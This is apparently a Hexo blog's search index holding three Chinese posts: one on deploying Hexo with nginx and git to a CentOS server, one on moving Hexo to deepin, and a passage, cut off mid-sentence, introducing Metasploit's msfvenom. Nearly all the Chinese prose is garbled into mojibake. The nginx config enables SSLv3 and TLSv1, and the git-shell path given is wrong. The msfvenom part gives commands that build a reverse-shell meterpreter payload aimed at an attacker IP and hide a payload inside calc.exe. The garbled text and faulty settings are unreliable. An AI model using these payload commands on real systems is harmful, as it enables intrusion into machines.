<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title><![CDATA[hexoä»Žgithubç§»åŠ¨åˆ°centosä¸ªäººæœåŠ¡å™¨]]></title>
    <url>%2F2018%2F08%2F09%2Fhexo%E4%BB%8Egithub%E7%A7%BB%E5%8A%A8%E5%88%B0centos%E4%B8%AA%E4%BA%BA%E6%9C%8D%E5%8A%A1%E5%99%A8%2F</url>
    <content type="text"><![CDATA[é…ç½®nginxï¼Œå°†http 301é‡å®šå‘åˆ°httpsï¼Œ å‰æœŸå®‰è£…é¦–å…ˆç”±äºŽnginxçš„ä¸€äº›æ¨¡å—ä¾èµ–ä¸€äº›libåº“ï¼Œæ‰€ä»¥åœ¨å®‰è£…nginxä¹‹å‰ï¼Œå¿…é¡»å…ˆå®‰è£…è¿™äº›libåº“1yum install -y pcre pcre-devel openssl openssl-devel zlib zlib-devel ä»¥åŠä¸‹é¢çš„gcc make wgetç­‰12yum -y install wgetyum install -y gcc gcc-c++ make http://nginx.org/en/download.html è¿™é‡Œæœ‰nginxå„ä¸ªç‰ˆæœ¬çš„ä¸‹è½½åœ°å€ åˆ›å»ºä¸€ä¸ªç›®å½•12mkdir /hexocd /hexo ä¸‹è½½nginxåŒ…1wget http://nginx.org/download/nginx-1.14.0.tar.gz è§£åŽ‹å®‰è£…1234tar -zxvf nginx-1.14.0.tar.gzcd nginx-1.14.0./configure --prefix=/hexo/nginx/ --with-http_ssl_module --with-http_realip_module --with-http_stub_status_module --with-debugmake &amp;&amp; make install &amp;&amp; echo "ok" yum -y install git #å®‰è£…gitadduser git #åˆ›å»ºä¸€ä¸ªgitç”¨æˆ·ï¼Œç”¨æ¥ä¸Žè™šæ‹ŸgitæœåŠ¡ åˆ›å»ºè£¸ä»“ï¼šåˆ›å»ºè¯ä¹¦ç™»å½•å°†æœ¬åœ°ç”¨æˆ·çš„å…¬é’¥id_rsa.pubå¯¼å…¥åˆ°/home/git/.ssh/authorized_keysæ–‡ä»¶é‡Œé¢åœ¨å¯¼å…¥ä¹‹å‰ï¼Œå¹¶æ²¡æœ‰.sshè¿™ä¸ªæ–‡ä»¶ä»¥åŠauthorized_keysè¿™ä¸ªæ–‡ä»¶æ‰€ä»¥å…ˆæ•²ä¸€ä¸‹å‘½ä»¤å»ºç«‹12cd /home/gitmkdir .ssh åˆ›å»ºä¸€ä¸ªæ–°æ–‡ä»¶1vim authorized_keys å…¬é’¥æ–‡ä»¶æœ¬åœ°åœ°å€ï¼šwindowsç”¨æˆ·ï¼šæœ¬åœ°ç”¨æˆ·å…¬é’¥æ–‡ä»¶åœ¨c:/users/ç”¨æˆ·/.ssh/é‡Œé¢ è¿™é‡Œçš„/å¥½åƒå†™åäº†ç”±äºŽæˆ‘ä½¿ç”¨çš„æ˜¯linuxç³»ç»Ÿï¼Œlinuxå…¬é’¥æ–‡ä»¶åœ¨/home/xxx/.ssh/id_rsa.pubé‡Œé¢linuxç”¨æˆ·ç›´æŽ¥è¾“å…¥cat /home/anjing/.ssh/id_rsa.pub å¯æŸ¥çœ‹åˆ°å°†å†…å®¹å¤åˆ¶åˆ°æœåŠ¡å™¨çš„authorized_keyså³å¯ å»ºç«‹gitä»“åº“ï¼šç”±äºŽæœåŠ¡å™¨ä¸Šæ²¡æœ‰gitä»“åº“ï¼Œæ‰€ä»¥æˆ‘ä»¬å…ˆå»ºç«‹ä¸€ä¸ª é€‰æ‹©ä¸€ä¸ªç›®å½•ä½œä¸ºgitä»“åº“12cd /home/gitgit init --bare hexo.git Gitå°±ä¼šåˆ›å»ºä¸€ä¸ªè£¸ä»“åº“ï¼Œè£¸ä»“åº“æ²¡æœ‰å·¥ä½œåŒºï¼Œå› ä¸ºæœåŠ¡å™¨ä¸Šçš„Gitä»“åº“çº¯ç²¹æ˜¯ä¸ºäº†å…±äº«ï¼Œæ‰€ä»¥ä¸è®©ç”¨æˆ·ç›´æŽ¥ç™»å½•åˆ°æœåŠ¡å™¨ä¸ŠåŽ»æ”¹å·¥ä½œåŒºï¼Œå¹¶ä¸”æœåŠ¡å™¨ä¸Šçš„Gitä»“åº“é€šå¸¸éƒ½ä»¥.gitç»“å°¾ã€‚ç„¶åŽï¼ŒæŠŠowneræ”¹ä¸ºgitå¦‚æžœæç¤ºå›¾ç‰‡ä¸Šçš„å†…å®¹è¡¨ç¤ºåˆ›å»ºæˆåŠŸæŽ¥ç€æ›´æ”¹æƒé™1chown -R git:git hexo.git ç¦ç”¨shellç™»å½•ï¼švim /etc/passwdæ‰¾åˆ°ç±»ä¼¼ä¸‹é¢è¿™è¡Œ1git:x:1001:1001::/home/git:/bin/bash å°†ä»–ä¿®æ”¹ä¸º1git:x:1001:1001::/home/git:/bin/bash/git-shell å°±æ˜¯åœ¨æœ€åŽé¢åŠ ä¸Šgit-shellå°±è¡Œäº†ï¼Œè¿™æ ·ï¼Œgitç”¨æˆ·å¯ä»¥æ­£å¸¸é€šè¿‡sshä½¿ç”¨gitï¼Œä½†æ˜¯æ— æ³•ç™»å½•shell é…ç½®nginxåˆšåˆšå°†nginxå®‰è£…åˆ°äº†/hexo/nginx é‡Œé¢ 1vim /hexo/nginx/conf/nginx.conf é¦–å…ˆå°†è¯ä¹¦ä¸Šä¼ ï¼Œå¦‚ä½•èŽ·å–è¯ä¹¦è‡ªå·±ç™¾åº¦æˆ–è°·æ­Œæ‰¾æ‰¾ï¼Œè¿™é‡Œæˆ‘ä»¬åªè°ˆæ€Žä¹ˆé…ç½® å¯ä»¥å°†é‡Œé¢çš„é…ç½®éƒ½åˆ é™¤ï¼Œä½¿ç”¨æˆ‘ä¸‹é¢çš„é…ç½®ï¼Œé»˜è®¤ä½¿ç”¨äº†httpsï¼Œå¦‚æžœä¸éœ€è¦å¯ä»¥è‡ªå·±åˆ é™¤443æ®µå’Œè·³è½¬12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576777879808182838485user git;worker_processes auto;pid logs/nginx.pid;worker_rlimit_nofile 10240;events &#123; use epoll; worker_connections 10240; multi_accept on; &#125;http &#123; include mime.types; default_type application/octet-stream; server_tokens off; client_header_buffer_size 32k; large_client_header_buffers 4 32k; sendfile on; keepalive_timeout 65; fastcgi_intercept_errors on; tcp_nodelay on; fastcgi_connect_timeout 300; fastcgi_send_timeout 300; fastcgi_read_timeout 300; fastcgi_buffer_size 64k; fastcgi_buffers 4 64k; fastcgi_busy_buffers_size 128k; fastcgi_temp_file_write_size 256k; gzip on; gzip_min_length 1k; gzip_buffers 4 16k; gzip_http_version 1.1; gzip_comp_level 2; gzip_types text/plain application/javascript application/x-javascript text/javascript text/css application/xml application/xml+rss; gzip_vary on; gzip_proxied expired no-cache no-store private auth; gzip_disable "MSIE [1-6]\."; server &#123; listen 80; server_name smelond.com; if ($scheme = http ) &#123; return 301 https://$host$request_uri; &#125; &#125; server &#123; listen 443; server_name smelond.com; ssl on; ssl_certificate /hexo/nginx/ssl/fullchain.pem; ssl_certificate_key /hexo/nginx/ssl/private.key; ssl_protocols TLSv1 TLSv1.1 TLSv1.2 SSLv3; ssl_ciphers ECDHE-RSA-AES128-GCM-SHA256:ECDHE:ECDH:AES:HIGH; ssl_prefer_server_ciphers on; root /home/git; index index.html index.htm; location ~ .*\.(ico|gif|jpg|jpeg|png|bmp|swf)$ &#123; access_log off; expires 1d; &#125; location ~ .*\.(js|css|txt|xml)?$ &#123; access_log off; expires 12h; &#125; location / &#123; try_files $uri $uri/ =404; &#125; access_log /hexo/nginx/logs/access_log.log; error_log /hexo/nginx/logs/error_log.log; &#125;&#125; å®ŒæˆåŽå¯ä»¥å¯åŠ¨nginx123/hexo/nginx/sbin/nginx -s reload # å¯åŠ¨nginx/hexo/nginx/sbin/nginx -s stop # åœæ­¢nginx/hexo/nginx/sbin/nginx -t # æ£€æŸ¥é…ç½®æ–‡ä»¶æ˜¯å¦æ­£ç¡® å¦‚å‡ºçŽ°æŠ¥é”™ï¼Œå¯ä»¥æ‰§è¡Œä¸‹é¢è¯­å¥ï¼Œç„¶åŽé‡æ–°å¯åŠ¨nginx1/hexo/nginx/sbin/nginx -c /hexo/nginx/conf/nginx.conf è‡ªåŠ¨éƒ¨ç½²åœ¨ç¬¬ä¸Šä¸€æ­¥ä¸­å»ºç«‹çš„è£¸ä»“ä¸­ï¼ˆhexo.gitç›®å½•ï¼‰ï¼Œæ‰¾åˆ°hooksç›®å½•ä¸‹çš„post-update.sample,å°†ä»–é‡å‘½åä¸ºpost-update12cd /home/git/hexo.git/hooks/mv post-update.sample post-update ç„¶åŽç”¨vimæ‰“å¼€post-updateæ·»åŠ ä¸‹é¢å†…å®¹ï¼š1git --work-tree=/home/git --git-dir=/home/git/hexo.git checkout -f 123456789#!/bin/shgit --work-tree=/home/git --git-dir=/home/git/hexo.git checkout -f #æ·»åŠ åˆ°#!/bin/shä¸‹é¢è¿™è¡Œå³å¯## An example hook script to prepare a packed repository for use over# dumb transports.## To enable this hook, rename this file to "post-update".exec git update-server-info æŽ¥ä¸‹æ¥åœ¨æœ¬åœ°çš„hexoé¡¹ç›®ä¸­ï¼Œç¼–è¾‘_config.ymlï¼Œéœ€è¦ä¿®æ”¹deployï¼Œåªéœ€è¦å°†repoåŽé¢çš„åŸŸåä¿®æ”¹ä¸ºä½ çš„æœåŠ¡å™¨åœ°å€(å¦‚æžœsshç«¯å£å·²ç»ä¿®æ”¹ï¼Œè¯·çœ‹è¸©å‘éƒ¨åˆ†)1234deploy: type: git repo: git@smelond.com:/home/git/hexo.git branch: master æŽ¥ç€å®‰è£…hexo-deployer-git1sudo npm install hexo-deployer-git --save å®ŒæˆåŽå°±å¯ä»¥æ‰§è¡Œäº†1234hexo new ""hexo cleanhexo ghexo d è¸©å‘æœ€åŽ çŒ®ä¸Šä¸€ä¸ªå·¨å¤§çš„å‘å¦‚æžœé‡åˆ°ç±»ä¼¼ä»¥ä¸Šé—®é¢˜ï¼Œå¯èƒ½æ˜¯ä½ çš„sshç™»å½•ç«¯å£ ä¸ä¸ºé»˜è®¤çš„22è§£å†³æ–¹æ³•ï¼šåœ¨_config.ymlé…ç½®æ–‡ä»¶ä¸­å°† git@smelond.com:/home/git/hexo.git ä¿®æ”¹ä¸º ssh://git@smelond.com:ç«¯å£å·/home/git/hexo.git1234deploy: type: git repo: ssh://git@smelond.com:9999/home/git/hexo.git #9999ä¸ºä½ çš„sshç«¯å£å· branch: master å‚è€ƒï¼šhttps://segmentfault.com/a/1190000005723321https://blog.csdn.net/pop1586082213/article/details/54576131https://www.liaoxuefeng.com/wiki/0013739516305929606dd18361248578c67b8067c8c017b000/00137583770360579bc4b458f044ce7afed3df579123eca000]]></content>
      <categories>
        <category>linux</category>
        <category>nginx</category>
      </categories>
      <tags>
        <tag>hexo</tag>
        <tag>linux</tag>
        <tag>nginx</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[hexoä»Žwindowsæ¬å®¶åˆ°deepin]]></title>
    <url>%2F2018%2F06%2F21%2Fhexo%E4%BB%8Ewindows%E6%90%AC%E5%AE%B6%E5%88%B0deepin%2F</url>
    <content type="text"><![CDATA[å®‰è£…éœ€è¦çš„è½¯ä»¶git å®¢æˆ·ç«¯ï¼š1sudo apt-get install git node.js:12sudo apt-get install -y nodejssudo apt-get install -y build-essential npm:1sudo apt-get install -y npm å®Œæˆä¹‹åŽå¯ä»¥ä½¿ç”¨-vå‘½ä»¤æ¥æŸ¥çœ‹æ˜¯å¦å®‰è£…æˆåŠŸ1234anjing@anjing-PC:~$ node -vv6.3.1anjing@anjing-PC:~$ npm -v4.4.2 æ·»åŠ æ–°ç§˜é’¥æŸ¥çœ‹ç§˜é’¥æ˜¯å¦æ·»åŠ 123456anjing@anjing-PC:~$ ssh -T git@github.comThe authenticity of host 'github.com (13.229.188.59)' can't be established.RSA key fingerprint is SHA256:nThbg6kXUpJWGl7E1IGOCspRomTxdCARLviKw6E5SY8.Are you sure you want to continue connecting (yes/no)? yesWarning: Permanently added 'github.com,13.229.188.59' (RSA) to the list of known hosts.Permission denied (publickey). çœ‹åˆ°æç¤ºPermission denied (publickey).é‚£å°±æ˜¯ç§˜é’¥æœ‰é—®é¢˜å’¯ åˆ›å»ºç§˜é’¥1ssh-keygen -t rsa -C "ä½ çš„é‚®ç®±åœ°å€" æŽ¥ç€æ•²ï¼“æ¬¡å›žè½¦ï¼Œå®Œæˆä¹‹åŽåœ¨/home/xxx/.ssh/ä¸‹é¢å¯ä»¥çœ‹åˆ°ç§˜é’¥ æŸ¥çœ‹ç§˜é’¥1cat /home/xxx/.ssh/id_rsa.pub ä¸Šä¼ ç§˜é’¥ç‚¹å‡»ï¼šå¤´åƒ -&gt; settings -&gt; SSH and GPG keys æŽ¥ç€å°†ä»¥å‰çš„ç§˜é’¥Deleteåˆ é™¤ç„¶åŽç‚¹å‡»ä¸Šæ–¹çš„New SSH key Titleå¤„éšä¾¿å¡«å†™ä¸€ä¸ªåå­—Key å¤„å°†/home/xxx/.ssh/id_rsa.pubé‡Œé¢çš„å†…å®¹å¤åˆ¶åˆ°é‡Œé¢æŽ¥ç€ç‚¹å‡»Add SSH key ç„¶åŽé‡æ–°è¾“å…¥ï¼š12anjing@anjing-PC:~$ ssh -T git@github.comHi smelond! You've successfully authenticated, but GitHub does not provide shell access. å¯ä»¥çœ‹åˆ°å·²ç»æˆåŠŸäº† é…ç½®ç”¨æˆ·åå’Œé‚®ç®±123git config --global user.name "ç”¨æˆ·å"git config --global user.email "é‚®ç®±" å°†æºæ–‡ä»¶æ‹·è´åˆ°ç›®å½•ç”±äºŽæˆ‘çš„ç›˜ç¬¦æ²¡æœ‰å…¨éƒ¨åˆ†åŒ–ä¸ºext4æ ¼å¼ï¼Œæˆ‘ç•™äº†40ï¼§çš„ç©ºé—´å‡ºæ¥ä½œä¸ºntfsï¼Œæ‰€ä»¥æˆ‘å°†æˆ‘çš„æ–‡ä»¶æ‹·è´åˆ°æŒ‚è½½çš„ç›®å½•/media/anjing/0007C530000C7583/blogï¼Œæˆ‘å·²ç»å°†æˆ‘çš„hexoé‡Œé¢çš„ç›®å½•å’Œæ–‡ä»¶ç§»åŠ¨åˆ°äº†è¿™é‡Œdeepinä¼šé»˜è®¤ä¼šè‡ªåŠ¨æŒ‚è½½æˆ‘ntfsæ ¼å¼çš„ç›˜ç¬¦éœ€è¦æ‹·è´æ–‡ä»¶å’Œç›®å½•æœ‰ï¼š123456_config.ymlpackage.jsonnode_modulesscaffoldssourcethemes ä¸Šé¢æ˜¯hexoçš„æ ¸å¿ƒæ–‡ä»¶ æŸ¥çœ‹ä¸€ä¸‹ï¼š12anjing@anjing-PC:/media/anjing/0007C530000C7583/blog$ ls_config.yml node_modules package.json scaffolds source themes å¯ä»¥çœ‹åˆ°æˆ‘å·²ç»æ‹·è´è¿‡æ¥äº† å®‰è£…hexoæ‰“å¼€ç»ˆç«¯è¾“å…¥1npm install hexo-cli -g ç»“æžœæç¤ºï¼š1234567891011121314151617181920212223npm WARN checkPermissions Missing write access to /usr/lib/node_modules/usr/libâ””â”€â”¬ hexo-cli@1.1.0 ....................çœç•¥npm WARN optional SKIPPING OPTIONAL DEPENDENCY: fsevents@^1.0.0 (node_modules/hexo-cli/node_modules/chokidar/node_modules/fsevents):npm WARN notsup SKIPPING OPTIONAL DEPENDENCY: Unsupported platform for fsevents@1.2.4: wanted &#123;"os":"darwin","arch":"any"&#125; (current: &#123;"os":"linux","arch":"x64"&#125;)npm ERR! path /usr/lib/node_modulesnpm ERR! code EACCESnpm ERR! errno -13npm ERR! syscall accessnpm ERR! Error: EACCES: permission denied, access '/usr/lib/node_modules'npm ERR! at Error (native)npm ERR! &#123; Error: EACCES: permission denied, access '/usr/lib/node_modules'npm ERR! at Error (native)npm ERR! errno: -13,npm ERR! code: 'EACCES',npm ERR! syscall: 'access',npm ERR! path: '/usr/lib/node_modules' &#125;npm ERR! npm ERR! Please try running this command again as root/Administrator.npm ERR! A complete log of this run can be found in:npm ERR! /home/anjing/.npm/_logs/2018-06-21T12_07_44_418Z-debug.log å¦‚æžœè¿™é‡Œå‡ºçŽ°é—®é¢˜å°±ä½¿ç”¨sudoå®‰è£…1sudo npm install hexo-cli -g æç¤ºæ¶ˆæ¯ï¼š123456/usr/bin/hexo -&gt; /usr/lib/node_modules/hexo-cli/bin/hexo/usr/libâ””â”€â”¬ hexo-cli@1.1.0 .....................çœç•¥npm WARN optional SKIPPING OPTIONAL DEPENDENCY: fsevents@^1.0.0 (node_modules/hexo-cli/node_modules/chokidar/node_modules/fsevents):npm WARN notsup SKIPPING OPTIONAL DEPENDENCY: Unsupported platform for fsevents@1.2.4: wanted &#123;"os":"darwin","arch":"any"&#125; (current: &#123;"os":"linux","arch":"x64"&#125;) çœ‹åˆ°æŠ¥é”™npm WARN ä½†æ˜¯è¿™é‡Œä¸è¦æƒŠæ…Œï¼Œå‡ºçŽ°WARNæ²¡ä»€ä¹ˆé—®é¢˜ï¼Œåªè¦ä¸å‡ºnpm ERR!å°±è¡Œäº† å®‰è£…ç›¸å…³æ¨¡å—12345npm installnpm install hexo-deployer-git --save // æ–‡ç« éƒ¨ç½²åˆ° git çš„æ¨¡å—ï¼ˆä¸‹é¢ä¸ºé€‰æ‹©å®‰è£…ï¼‰npm install hexo-generator-feed --save // å»ºç«‹ RSS è®¢é˜…npm install hexo-generator-sitemap --save // å»ºç«‹ç«™ç‚¹åœ°å›¾ å®‰è£…ä¸Šé¢çš„æ¨¡å—å¯èƒ½ä¼šå‡ºçŽ°ä¸‹é¢é”™è¯¯ï¼Œä¸ç”¨ç®¡å³å¯12npm WARN optional SKIPPING OPTIONAL DEPENDENCY: fsevents@^1.0.0 (node_modules/chokidar/node_modules/fsevents):npm WARN notsup SKIPPING OPTIONAL DEPENDENCY: Unsupported platform for fsevents@1.2.4: wanted &#123;"os":"darwin","arch":"any"&#125; (current: &#123;"os":"linux","arch":"x64"&#125;) æµ‹è¯•hexoå®Œæˆä»¥åŽä¸€å®šè¦åœ¨æœ¬åœ°æµ‹è¯•å¥½ é¦–å…ˆæˆ‘ä»¬æ–°å»ºä¸€ç‰‡æ–‡ç« ï¼š1hexo new "test" æŽ¥ç€ç¼–è¾‘ä¸€ä¸‹ï¼š ä¿å­˜åŽéƒ¨ç½²æœ¬åœ°å‘å¸ƒ123hexo clean //æ¸…é™¤ç¼“å­˜hexo generate //ç”Ÿæˆé™æ€æ–‡ä»¶hexo server //æœ¬åœ°å¯åŠ¨æœåŠ¡ å¯ä»¥çœ‹åˆ°åœ¨æœ¬åœ°å·²ç»å‘å¸ƒæˆåŠŸäº† éƒ¨ç½²åˆ°githubä¸Šéƒ¨ç½²ä¹‹å‰éœ€è¦å…ˆä¿®æ”¹hexoé…ç½®æ–‡ä»¶æ‰“å¼€_config.ymlæ‰¾åˆ°12345deploy: type: git # repo: https://github.com/smelond/smelond.github.io.git //å°†è¿™ä¸ªæ³¨é‡Š repo: git@github.com:smelond/smelond.github.io.git //ä¿®æ”¹ä¸ºè¿™ä¸ª branch: master å¦‚æžœä¸ä¿®æ”¹ä¸Šé¢çš„å†…å®¹å¯èƒ½éƒ¨ç½²ä¼šæ˜¾ç¤ºç­‰å…¶ä»–é”™è¯¯ï¼š12Username for 'https://github.com': Password for 'https://smelond@github.com': è§£å†³åˆ°ä¸Šé¢çš„é—®é¢˜ï¼Œå°±å¯ä»¥å¼€å§‹éƒ¨ç½²äº† éƒ¨ç½²123hexo clean //æ¸…é™¤ç¼“å­˜hexo generate //ç”Ÿæˆé™æ€æ–‡ä»¶hexo deploy //éƒ¨ç½²ç½‘ç«™åˆ°è®¾å®šçš„ä»“åº“ å°å°çš„æç¤ºï¼šåœ¨hexo deploy å¯èƒ½ä¼šå¡ï¼•åˆ†é’Ÿå·¦å³1234567anjing@anjing-PC:/media/anjing/0007C530000C7583/blog$ hexo dINFO Deploying: gitINFO Clearing .deploy_git folder...INFO Copying files from public folder...INFO Copying files from extend dirs...[master fdb7ea5] Site updated: 2018-06-21 20:42:26 1 file changed, 1 insertion(+), 1 deletion(-) //åœ¨è¿™ä¸ªä½ç½®å¯èƒ½ä¼šå¡ä¸»ä¸åŠ¨ï¼•åˆ†é’Ÿå·¦å³ ç­‰å¸¦å‡ åˆ†é’ŸåŽä¼šæç¤ºï¼š123To github.com:smelond/smelond.github.io.git + b66a43b...fdb7ea5 HEAD -&gt; master (forced update)åˆ†æ”¯ master è®¾ç½®ä¸ºè·Ÿè¸ªæ¥è‡ª git@github.com:smelond/smelond.github.io.git çš„è¿œç¨‹åˆ†æ”¯ masterã€‚ æç¤ºä¸Šé¢çš„å†…å®¹è¡¨ç¤ºå·²ç»æŽ¨é€åˆ°githubä¸Šäº†æŽ¥ç€æ‰“å¼€åšå®¢çœ‹ä¸€ä¸‹ï¼š å…¶ä»–é—®é¢˜ï¼šå¦‚æžœéƒ¨ç½²ç½‘ç«™åˆ°è®¾å®šçš„ä»“åº“å‡ºçŽ°ï¼š12345678anjing@anjing-PC:/media/anjing/0007C530000C7583/blog$ hexo dINFO Deploying: gitINFO Clearing .deploy_git folder...INFO Copying files from public folder...INFO Copying files from extend dirs...[master 5de89e9] Site updated: 2018-06-21 20:31:16 1 file changed, 1 insertion(+), 1 deletion(-)Warning: Permanently added the RSA host key for IP address '13.250.177.223' to the list of known hosts. å¦‚æžœå‡ºçŽ°è¿™æ¡Warningå°±å°†/home/xxx/.ssh/ä¸‹çš„id_rsa.pub å’Œ id_rsaåˆ é™¤12rm -rf /home/xxx/.ssh/id_rsa.pubrm -rf /home/xxx/.ssh/id_rsa ç„¶åŽé‡æ–°åˆ›å»ºä¸Šä¼ ç§˜é’¥å³å¯ å‚è€ƒï¼šhttps://blog.csdn.net/lvonve/article/details/79587321https://blog.csdn.net/Greenovia/article/details/60576985]]></content>
      <categories>
        <category>linux</category>
      </categories>
      <tags>
        <tag>hexo</tag>
        <tag>linux</tag>
        <tag>deepin</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[ç½‘ç«™ææƒä¹‹MSFéªšæ“ä½œ]]></title>
    <url>%2F2018%2F04%2F20%2F%E7%BD%91%E7%AB%99%E6%8F%90%E6%9D%83%E4%B9%8BMSF%E9%AA%9A%E6%93%8D%E4%BD%9C%2F</url>
    <content type="text"><![CDATA[æµ‹è¯•çŽ¯å¢ƒï¼š å†…ç½‘ï¼Œæ²¡é’±ä¹°æœåŠ¡å™¨ï¼Œè€Œä¸”è¿˜æ‹¿ä¸åˆ°ç«™ï¼Œå°´å°¬çš„äº‹æƒ…ðŸ˜­ æ”»å‡»è€…ï¼šparrotos è¿™ä¸ªç³»ç»Ÿè·Ÿkaliå·®ä¸å¤š æœåŠ¡å™¨ï¼šwindows2003 é‚£ä¹ˆï¼Œæˆ‘ä»¬çŽ°åœ¨å…ˆæ¥çœ‹çœ‹ä½¿ç”¨msfvenomå¦‚ä½•ç”Ÿæˆpayload msfvenomè¿™ä¸ªæ˜¯ä¸€ä¸ªä»€ä¹ˆä¸œè¥¿å°±ä¸ç”¨è¯´äº†å§ï¼ŒçŽ©è¿‡metasploitçš„éƒ½çŸ¥é“ï¼ˆè¡¨ç¤ºæˆ‘è¿˜æ˜¯ä¸€ä¸ªæ–°æ‰‹ï¼ï¼ï¼ï¼‰ï¼Œå½“ç„¶æ²¡çŽ©è¿‡çš„è‡ªè¡Œè°·æ­Œï¼Œå·²ç»å¾ˆå¤šå¤§ä½¬è·Ÿæˆ‘è¯´è¿‡è¿™ä¸ªæ˜¯æ¸—é€æµ‹è¯•æœ€åŸºæœ¬çš„ä¸œè¥¿ åœ¨freebufä¸Šé¢çœ‹åˆ°msfvenomå‘½ä»¤è¡Œé€‰é¡¹çš„ä¸­æ–‡ç¿»è¯‘ï¼Œæˆ‘ç›´æŽ¥æ¬è¿‡æ¥äº†ï¼Œä¸çŠ¯æ³•å§ï¼Œå“ˆå“ˆå“ˆï¼ï¼ï¼ msfvenomå‘½ä»¤è¡Œé€‰é¡¹Options:12345678910111213141516171819-p, --payload &lt;payload&gt; æŒ‡å®šéœ€è¦ä½¿ç”¨çš„payload(æ”»å‡»è½½è·)ã€‚å¦‚æžœéœ€è¦ä½¿ç”¨è‡ªå®šä¹‰çš„payloadï¼Œè¯·ä½¿ç”¨&apos;-&apos;æˆ–è€…stdinæŒ‡å®š-l, --list [module_type] åˆ—å‡ºæŒ‡å®šæ¨¡å—çš„æ‰€æœ‰å¯ç”¨èµ„æº. æ¨¡å—ç±»åž‹åŒ…æ‹¬: payloads, encoders, nops, all-n, --nopsled &lt;length&gt; ä¸ºpayloadé¢„å…ˆæŒ‡å®šä¸€ä¸ªNOPæ»‘åŠ¨é•¿åº¦-f, --format &lt;format&gt; æŒ‡å®šè¾“å‡ºæ ¼å¼ (ä½¿ç”¨ --help-formats æ¥èŽ·å–msfæ”¯æŒçš„è¾“å‡ºæ ¼å¼åˆ—è¡¨)-e, --encoder [encoder] æŒ‡å®šéœ€è¦ä½¿ç”¨çš„encoderï¼ˆç¼–ç å™¨ï¼‰-a, --arch &lt;architecture&gt; æŒ‡å®špayloadçš„ç›®æ ‡æž¶æž„ --platform &lt;platform&gt; æŒ‡å®špayloadçš„ç›®æ ‡å¹³å°-s, --space &lt;length&gt; è®¾å®šæœ‰æ•ˆæ”»å‡»è½½è·çš„æœ€å¤§é•¿åº¦-b, --bad-chars &lt;list&gt; è®¾å®šè§„é¿å­—ç¬¦é›†ï¼Œæ¯”å¦‚: &apos;\x00\xff&apos;-i, --iterations &lt;count&gt; æŒ‡å®špayloadçš„ç¼–ç æ¬¡æ•°-c, --add-code &lt;path&gt; æŒ‡å®šä¸€ä¸ªé™„åŠ çš„win32 shellcodeæ–‡ä»¶-x, --template &lt;path&gt; æŒ‡å®šä¸€ä¸ªè‡ªå®šä¹‰çš„å¯æ‰§è¡Œæ–‡ä»¶ä½œä¸ºæ¨¡æ¿-k, --keep ä¿æŠ¤æ¨¡æ¿ç¨‹åºçš„åŠ¨ä½œï¼Œæ³¨å…¥çš„payloadä½œä¸ºä¸€ä¸ªæ–°çš„è¿›ç¨‹è¿è¡Œ --payload-options åˆ—ä¸¾payloadçš„æ ‡å‡†é€‰é¡¹-o, --out &lt;path&gt; ä¿å­˜payload-v, --var-name &lt;name&gt; æŒ‡å®šä¸€ä¸ªè‡ªå®šä¹‰çš„å˜é‡ï¼Œä»¥ç¡®å®šè¾“å‡ºæ ¼å¼ --shellest æœ€å°åŒ–ç”Ÿæˆpayload-h, --help æŸ¥çœ‹å¸®åŠ©é€‰é¡¹ --help-formats æŸ¥çœ‹msfæ”¯æŒçš„è¾“å‡ºæ ¼å¼åˆ—è¡¨ ç”Ÿæˆpayloadç”Ÿæˆpayloadï¼Œæœ‰æœ‰ä¸¤ä¸ªå¿…é¡»çš„é€‰é¡¹ï¼š-p -fä½¿ç”¨-p æ¥æŒ‡å®šè¦ä½¿ç”¨çš„payloadã€‚å¯ä»¥ä½¿ç”¨ä¸‹é¢çš„å‘½ä»¤æ¥æŸ¥çœ‹æ‰€æœ‰msfå¯ç”¨çš„payloadåˆ—è¡¨1./msfvenom -l payloads -pé€‰é¡¹ä¹Ÿæ”¯æŒä½¿ç”¨ä½¿ç”¨è‡ªå®šä¹‰çš„payloadï¼Œéœ€è¦ä½¿ç”¨ â€œ-â€œï¼Œæ¯”å¦‚:1cat payload_file.bin | ./msfvenom -p - -a x86 --platform win -e x86/shikata_ga_nai -f raw ä½¿ç”¨-f æ¥æŒ‡å®špayloadçš„è¾“å‡ºæ ¼å¼ä¸¾ä¾‹ï¼š1./msfvenom -p windows/meterpreter/bind_tcp -f exe ä½¿ç”¨ä¸‹é¢çš„å‘½ä»¤ï¼Œå¯ä»¥äº§çœ‹msfæ”¯æŒçš„è¾“å‡ºæ ¼å¼1./msfvenom --help-formats ä¸€ä¸ªå…¸åž‹çš„msfvenomä½¿ç”¨ä¸¾ä¾‹å¦‚ä¸‹ï¼š1$ ./msfvenom -p windows/meterpreter/reverse_tcp lhost=[Attacker&apos;s IP] lport=4444 -f exe -o /tmp/my_payload.exe ä½¿ç”¨è‡ªå®šä¹‰å¯æ‰§è¡Œæ–‡ä»¶æ¨¡æ¿é»˜è®¤çš„ï¼Œmsfvenomä½¿ç”¨çš„æ¨¡æ¿æ–‡ä»¶ä¿å­˜åœ¨msf/data/templatesç›®å½•ä¸­ï¼Œå¦‚æžœä½ æƒ³ä½¿ç”¨ä½ è‡ªå·±çš„æ¨¡æ¿æ–‡ä»¶ï¼Œä½ å¯ä»¥ä½¿ç”¨-xé€‰é¡¹æ¥æŒ‡å®šï¼Œæ¯”å¦‚ï¼š1./msfvenom -p windows/meterpreter/bind_tcp -x calc.exe -f exe &gt; new.exe è¿™ä¸ªå‘½ä»¤å°†ä½¿ç”¨windowsä¸‹è®¡ç®—å™¨ç¨‹åºï¼ˆcalc.exeï¼‰ä½œä¸ºå¯æ‰§è¡Œæ–‡ä»¶çš„æ¨¡æ¿ç”Ÿæˆpayloadã€‚æ³¨æ„ï¼šå¦‚æžœä½ æƒ³è¦åˆ›å»ºä¸€ä¸ªwindowsçš„x64çš„å¯æ‰§è¡Œæ–‡ä»¶æ¨¡æ¿æ¥ç”Ÿæˆä¸€ä¸ªx64çš„payloadï¼Œä½ åªèƒ½ä½¿ç”¨exeæ ¼å¼çš„æ¨¡æ¿ã€‚ä½¿ç”¨-xé€‰é¡¹ç»å¸¸å’Œ-ké€‰é¡¹é…åˆä½¿ç”¨ï¼Œ-ké€‰é¡¹ä¼šå°†ä½ 